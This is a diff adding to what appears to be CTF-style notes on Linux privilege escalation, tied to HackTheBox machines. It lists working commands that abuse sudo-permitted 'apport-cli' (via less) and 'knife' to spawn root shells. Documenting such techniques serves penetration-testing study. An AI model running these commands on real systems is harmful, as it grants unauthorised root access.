@@ -143,4 +143,16 @@ $ sudo /usr/bin/apport-cli --file-bug
 [![sau](../../../../_badges/htb-p/sau.svg)](https://app.hackthebox.com/machines/Sau)
 
 While it seems secure, the reader opened is `less` which can be leveraged to run commands: `!/bin/bash`.
+
+* `/usr/bin/knife`: [knife](http://manpages.ubuntu.com/manpages/bionic/man1/knife.1.html) can be exploited in many ways
+
+[![knife](../../../../_badges/htb-p/knife.svg)](https://app.hackthebox.com/machines/Knife)
+
+```ps
+$ sudo knife environment edit _default -e vim # -> sudo vim
+$ sudo knife environment edit _default -e rootbash.sh
+$ sudo knife exec --exec "exec '/bin/sh -i'"
+$ echo -n 'exec "/bin/bash -i"' > config.rb
+$ sudo knife user list -c config.rb
+```
 </div></div>
